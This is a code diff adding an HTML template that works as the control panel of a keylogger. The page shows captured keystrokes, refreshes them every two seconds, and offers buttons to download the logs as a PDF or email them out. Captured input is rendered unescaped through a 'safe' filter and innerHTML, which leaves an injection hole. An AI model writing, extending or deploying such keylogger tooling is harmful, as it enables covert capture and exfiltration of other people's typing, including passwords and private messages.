@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{title}}</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin-bottom: 5px;
+            background-color: #f2f2f2;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .special-key {
+            color: red;  /* Style special keys with red color */
+        }
+
+        .download-btn {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+
+        .email-btn {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <ul id="keystrokes-list">
+            {% for keystroke in keystrokes %}
+                <li>{{ keystroke | safe }}</li>
+            {% endfor %}
+        </ul>
+
+
+    </div>
+   
+    <script>
+        // Function to fetch and update keystrokes
+        function updateKeystrokes() {
+            fetch('/logged_keystrokes')
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('content').innerHTML = '<h1>Logged Keystrokes</h1>' + data;
+                })
+                .catch(error => {
+                    console.error('Error fetching keystrokes:', error);
+                });
+        }
+
+        // Update keystrokes every 2 seconds
+        setInterval(updateKeystrokes, 2000);
+
+        // Initial update on page load
+        updateKeystrokes();
+
+        var downloadBtn = document.createElement('button');
+        downloadBtn.className = 'download-btn';
+        downloadBtn.textContent = 'Download PDF';
+        downloadBtn.onclick = function() {
+            // Send a request to download the PDF
+            window.location.href = '/download_logs_as_pdf';
+        };
+         
+        // Append button to body
+        document.body.appendChild(downloadBtn);
+
+        var emailbtn = document.createElement('button');
+        emailbtn.className = 'email-btn';
+        emailbtn.textContent = 'Send Email';
+        emailbtn.onclick = function() {
+            // Send a request to download the PDF
+            window.location.href = '/send_logs_email';
+        };
+
+        // Append button to body
+        document.body.appendChild(emailbtn);
+    </script>
+</body>
+</html>
+
+
+
+
